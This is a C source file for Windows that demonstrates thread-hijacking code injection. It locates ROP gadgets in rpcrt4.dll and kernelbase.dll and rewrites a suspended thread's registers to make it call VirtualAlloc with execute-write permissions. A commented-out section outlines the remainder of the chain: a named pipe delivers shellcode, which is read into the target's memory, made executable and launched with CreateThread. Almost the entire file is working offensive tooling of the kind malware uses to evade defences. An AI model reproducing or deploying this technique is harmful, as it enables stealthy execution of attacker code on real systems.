#include <Windows.h>

#include <stdio.h>

#define ArraySize(x) (sizeof x / sizeof x[0])

typedef struct Gadgets {
    UINT_PTR pshc; // push Rdx; call Rax
    UINT_PTR jmps; // jmp $
    UINT_PTR ret;  // ret
} Gadgets;

UINT_PTR find_gadget(const unsigned char* pattern, int sz, const char* name) {
    HMODULE base = GetModuleHandleA(name);
    if (!base) {
        return 0;
    }

    // Adjust for 64-bit pointers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((uintptr_t)base + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

    // Locate the .text section
    for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((const char*)sectionHeader[i].Name, ".text") == 0) {
            uintptr_t ptr = (uintptr_t)base + sectionHeader[i].VirtualAddress;
            size_t virtsize = sectionHeader[i].SizeOfRawData;
            size_t c = 0;

            // Search for the pattern
            while (c + sz <= virtsize && memcmp(pattern, (const unsigned char*)(ptr + c), sz) != 0) {
                c++;
            }
            if (c + sz <= virtsize) {
                return ptr + c; // Return the address of the found pattern
            }
            else {
                return 0; // Pattern not found
            }
        }
    }
    return 0; // No .text section found
}

//wait for user time to increase, signify kernel exit, thread can be manipulated
void waitunblock(HANDLE thd) {
    FILETIME a, b, c, d;
    GetThreadTimes(thd, &a, &b, &c, &d);
    DWORD pt = d.dwLowDateTime;
    while (1) {
        Sleep(1);
        GetThreadTimes(thd, &a, &b, &c, &d);
        if (d.dwLowDateTime - pt > 9) break; //when user time is >90% of total time, we're probably done
        pt = d.dwLowDateTime;
    }
    return;
}

void slay(HANDLE hThread, Gadgets gadgets, DWORD64 a, DWORD64 b, DWORD64 c, DWORD64 d) {

    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(hThread, &ctx);

    ctx.Rsp += 8;
    ctx.Rip = gadgets.ret;

    ctx.Rcx = a;
    ctx.Rdx = b;
    ctx.R8  = c;
    ctx.R9  = d;

    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);
}

DWORD64 pushm(HANDLE thd, Gadgets gadgets, DWORD64 data) {
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };

    GetThreadContext(thd, &ctx);

    ctx.Rsp += 8;
    ctx.Rip = gadgets.pshc;
    ctx.Rdx = data;
    ctx.Rax = gadgets.jmps;


    SetThreadContext(thd, &ctx);
    ResumeThread(thd);
    Sleep(2);
    SuspendThread(thd);

    return ctx.Rsp - 8;
}

void push_junk(HANDLE hThread, Gadgets gadgets) {
    
    SuspendThread(hThread);
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    
    GetThreadContext(hThread, &ctx);

    ctx.Rdx = 0;
    ctx.Rip = gadgets.pshc;
    ctx.Rax = gadgets.jmps;

    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);
    Sleep(2);
    SuspendThread(hThread);
}

DWORD WINAPI ThreadFunc(LPVOID lpParam) {
    while (1) {
        printf("[*] Victum Thread is running...\n");
        Sleep(100);
    }
    return 0;
}

int main(void) {

    HANDLE hThread = CreateThread(NULL, 0, ThreadFunc, NULL, CREATE_SUSPENDED, NULL);
    if (hThread == NULL) {
        printf("[!] CreateThread failed with error code: %lu\n", GetLastError());
        return 1;
    }

    if (LoadLibraryA("rpcrt4.dll") == NULL) {
        printf("[!] LoadLibraryA failed with error code: %lu\n", GetLastError());
        return 1;
    }

    Gadgets gadgets = {
        .pshc = find_gadget("\x52\xFF\xD0", 3, "rpcrt4.dll"),     // push rdx; call rax
        .jmps = find_gadget("\xEB\xFE",     2, "kernelbase.dll"), // jmp $
        .ret  = find_gadget("\xC3",         1, "kernelbase.dll"), // ret
    };

    if (gadgets.pshc == 0 || gadgets.jmps == 0 || gadgets.ret == 0) {
        printf("[!] Gadgets could not be found\n");
        return 1;
    }

    const char pipename[] = "\\\\.\\pipe\\spooky";
    if (ArraySize(pipename) % 8 != 0) {
        printf("[!] pipename (including the null byte) MUST be a multiple of 8\n");
        return 1;
    }

    const UINT32 HeapAllocSize = 0x2000;

    // Set RIP to a `jmp $`, blocks when kernel exit
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(hThread, &ctx);

    ctx.Rip = gadgets.jmps;

    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);

    printf("[*] Primed thread, waiting for kernel exit...\n");

    // Wait for thread's user time to increase, signifying kernel exit
    waitunblock(hThread);
    printf("[*] Process exited kernel, ready for injection\n");

    // Push a junk val to stack, this is quite useless but it simplifies the code
    push_junk(hThread, gadgets);



    DWORD64 fnVirtualAlloc = (DWORD64)GetProcAddress(GetModuleHandleA("kernelbase.dll"), "VirtualAlloc");

    pushm(hThread, gadgets, gadgets.jmps);
    pushm(hThread, gadgets, fnVirtualAlloc);

    slay(hThread, gadgets, 0, 0x10000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);


    WaitForSingleObject(hThread, INFINITE);
    return 0;


    // HERE

    //push(jmps);
    //push(gpa("kernelbase.dll", "VirtualAlloc"));

    ////execute
    //slay(thd, PAGE_EXECUTE_READWRITE, MEM_COMMIT, 0x6969, 0);






    ////inject the buffer

    //DWORD_PTR namptr;
    //for (int j = sizeof(pipename); j > 0; j -= 8) {
    //    DWORD64 num = 0;
    //    memcpy(&num, pipename + j - 8, 8);
    //    namptr = push(num);
    //}
    //printf("Pipe name injected to stack\n");

    ////make our pipe    
    //HANDLE pipe = CreateNamedPipe(pipename, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE, 1, HeapAllocSize, 0, 5000, NULL);


    ///*
    //    HANDLE CreateFileA(
    //      [in]           LPCSTR                lpFileName,
    //      [in]           DWORD                 dwDesiredAccess,
    //      [in]           DWORD                 dwShareMode,
    //      [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    //      [in]           DWORD                 dwCreationDisposition,
    //      [in]           DWORD                 dwFlagsAndAttributes,
    //      [in, optional] HANDLE                hTemplateFile
    //    );
    //*/

    ////connect victim process to pipe
    ////push(0);
    ////push(FILE_ATTRIBUTE_NORMAL);
    ////push(OPEN_EXISTING);
    ////push(0);
    //push(FILE_SHARE_READ);
    //push(GENERIC_READ);
    //push(namptr);
    //push(jmps);
    //push(gpa("kernel32.dll", "CreateFileA"));


    ////execute
    //slay(thd, 0, FILE_ATTRIBUTE_NORMAL, OPEN_EXISTING, 0);

    //waitunblock(thd);
    //DWORD64 phand = getretpush(0, thd); //HANDLE object in victim process
    //printf("Pipes connected\n");

    ////push virtualalloc, alloc 1 page in RW in victim process
    ////push(PAGE_READWRITE);
    ////push(MEM_COMMIT);
    ////push(HeapAllocSize);
    ////push(0);
    //push(jmps);
    //push(gpa("kernelbase.dll", "VirtualAlloc"));

    ////execute
    //slay(thd, PAGE_READWRITE, MEM_COMMIT, HeapAllocSize, 0);

    //waitunblock(thd);
    //DWORD64 addr = getretpush(0, thd);
    //printf("VirtualAlloc'd memory at 0x%lx. Preparing ROP sled...\n", addr);



    //DWORD bw = 0;
    //WriteFile(pipe, buf, sizeof(buf), &bw, NULL);
    //printf("Data written to pipe. Executing ROP sled...\n");


    ////read bytes from pipe
    ////push(0);
    ////push(namptr); //same strat as VirtualProtect
    ////push(HeapAllocSize);
    ////push(addr);
    //push(phand);
    ////push(ret);
    //push(gpa("kernel32.dll", "ReadFile"));

    //slay(thd, 0, namptr, HeapAllocSize, addr);

    ////push(phand);
    ////push(ret);
    //push(gpa("kernel32.dll", "CloseHandle"));
    //slay(thd, phand, NULL, NULL, NULL);

    ////push(namptr); //just use unused portion of stack for mandatory LPVOID
    ////push(PAGE_EXECUTE_READ);
    ////push(HeapAllocSize);
    ////push(addr);
    ////push(ret);
    //push(gpa("kernelbase.dll", "VirtualProtect"));
    //slay(thd, namptr, PAGE_EXECUTE_READ, HeapAllocSize, addr);


    ////prepare ReadFile -> CloseHandle -> VirtualProtect -> CreateThread rop sled
    ////push(0);
    ////push(0);
    ////push(addr);
    ////push(0);
    //push(0);
    ////push(jmps);
    //push(gpa("kernel32.dll", "CreateThread"));
    //slay(thd, 0, 0, addr, 0);


    ////write data to pipe

    ////slay(thd);
    //printf("Waiting for shellcode thread creation...\n");
    //waitunblock(thd);
    //printf("Execution completed! Restoring original thread...\n");
    //DisconnectNamedPipe(pipe);
    //SuspendThread(thd);
    //SetThreadContext(thd, &ctx);
    //ResumeThread(thd);
    //printf("Full injection sequence done. Time elapsed: %dms\n", GetTickCount() - t0);
}
